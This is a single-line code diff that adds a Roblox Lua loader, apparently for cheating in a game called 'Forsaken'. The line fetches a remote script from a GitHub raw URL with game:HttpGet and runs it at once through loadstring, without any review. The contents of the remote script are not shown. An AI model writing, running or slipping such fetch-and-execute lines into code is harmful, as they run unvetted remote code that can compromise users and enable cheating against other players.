@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/upd-forsaken-spam3-e1c81hppj1k19z.lua"))()
